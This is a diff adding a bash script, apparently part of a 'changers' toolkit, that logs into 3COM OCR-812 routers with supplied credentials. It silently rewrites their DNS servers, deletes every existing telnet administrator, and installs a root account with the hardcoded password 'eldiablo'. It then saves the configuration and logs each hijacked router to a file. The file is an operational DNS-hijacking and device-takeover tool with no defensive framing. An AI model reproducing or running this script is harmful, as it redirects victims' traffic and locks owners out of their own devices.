@@ -1,0 +1,24 @@
+#!/bin/bash
+
+##########################
+# by bonny               #
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+###########################
+
+${CURL} -u "$USERNAME:$PASSWORD" -d "usrDnsAdminStatus=1&RadioGroupDNSAddr=1&usrDnsServerPriAddress=$DNS1&usrDnsServerSecAddress=$DNS2" "http://$HOSTNAME/Forms/dns" 1>/dev/null 2>/dev/null
+${CURL} -u "$USERNAME:$PASSWORD" -d "uumUserName=tempuser&uumUserPassword=temppass&Submit=Submit" "http://$HOSTNAME/US/tempuser/Forms/admin_telnet_add" 1>/dev/null 2>/dev/null
+for i in `${CURL} -u "$USERNAME:$PASSWORD" "http://$HOSTNAME/admin_telnet_select" | egrep -i "^<OPTION" | sed "s/<OPTION>//;s/<OPTION SELECTED>//"`; do
+	${CURL} -u "tempuser:temppass" -d "adminTelnetSelect=$i&Submit=Delete" "http://$HOSTNAME/US/$i/Forms/admin_telnet_select" 1>/dev/null 2>/dev/null
+done
+${CURL} -u "tempuser:temppass" -d "uumUserName=root&uumUserPassword=$PASSWD&Submit=Submit" "http://$HOSTNAME/US/root/Forms/admin_telnet_add" 1>/dev/null 2>/dev/null
+${CURL} -u "root:$PASSWD" -d "adminTelnetSelect=tempuser&Submit=Delete" "http://$HOSTNAME/US/tempuser/Forms/admin_telnet_select" 1>/dev/null 2>/dev/null
+${CURL} -u "root:$PASSWD" -d "Submit=Save+Configuration" "http://$HOSTNAME/Forms/saveConf" 1>/dev/null 2>/dev/null
+
+echo "[+] modificado, http://$HOSTNAME $USERNAME:$PASSWORD [3COM OCR-812]"
+echo "http://$HOSTNAME ($USERNAME:$PASSWORD => $PASSWD) [3COM OCR-812]" >> logs/modificados.log
